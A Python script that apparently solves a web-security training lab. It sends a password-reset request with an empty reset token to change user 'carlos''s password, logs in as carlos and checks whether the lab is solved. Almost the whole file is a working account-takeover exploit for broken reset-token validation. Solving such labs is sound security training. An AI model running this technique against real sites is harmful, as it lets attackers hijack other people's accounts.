import requests
import re

def solve_lab(session, domain):
    url = domain + '/forgot-password?temp-forgot-password-token='
    data = {'temp-forgot-password-token': '', 'username' : 'carlos', 'new-password-1': '123456', 'new-password-2': '123456'}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Password changed')

def login(session, domain, username, password):
    url = domain + '/login'
    data = {'username': username, 'password': password}
    r = session.post(url, data=data, allow_redirects=False)
    if (r.status_code == 302):
        print('Login success')

def verify(session, domain):
    r = session.get(domain)
    if ('Solved' in r.text):
        print('Solved. Visit ' + domain + ' to see the solution.')
    else:
        print('Not solved yet.')
    
if __name__ == '__main__':
    url = input('Enter the URL the lab provide: ')
    domain = re.search(r'^(https?://[^/]+)', url).group(1)
    with requests.Session() as session:
        solve_lab(session, domain)
        login(session, domain, 'carlos', '123456')
        verify(session, domain)
        